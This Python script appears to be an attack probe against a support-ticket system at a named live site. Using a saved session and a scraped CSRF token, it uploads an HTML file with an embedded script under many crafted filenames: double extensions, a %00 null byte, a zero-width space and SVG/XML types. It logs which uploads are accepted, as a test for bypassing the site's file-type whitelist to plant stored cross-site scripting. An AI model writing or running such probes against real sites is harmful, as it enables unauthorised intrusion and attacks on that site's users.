import pyapi as P, mp, re, time, json, sys
o=P.op('jarA.txt')
exts=["a.html","a.htm","a.xhtml","a.svg","a.svgz","a.xml","a.phtml","a.shtml","a.html.png","a.png.html","a.HTML","a.html%00.png","a.html\u200b"]
body_content="<h1>ct</h1><script>document.title='X'</script>"
res=[]
for name in exts:
    st,fin,b,h=P.go(o,'https://xeovo.com/tickets/view/6592')
    tok=re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"',b).group(1)
    hdr,rb=mp.build({'csrfmiddlewaretoken':tok,'message':'ext whitelist probe '+name},{'files':(name,'text/html',body_content)})
    st2,f2,b2,h2=P.go(o,'https://xeovo.com/tickets/view/6592',raw=rb,headers=dict(hdr,Referer='https://xeovo.com/tickets/view/6592',Origin='https://xeovo.com'))
    o.cj.save('jarA.txt',ignore_discard=True,ignore_expires=True)
    atts=sorted(set(re.findall(r'/tickets/attachment/(\d+)/([^"\x27 ]+)',b2)))
    err=re.findall(r'form-errors-json" type="application/json">(.{0,200}?)</script>',b2)
    msg=re.findall(r'<div class="message error">\s*<p>([^<]*)',b2)
    res.append((name,st2,atts,err[:1],msg))
    print(name,'|',st2,'|',atts,'|',err[:1],'|',msg,flush=True)
    time.sleep(2.5)
json.dump(res,open('extprobe.json','w'),indent=1)
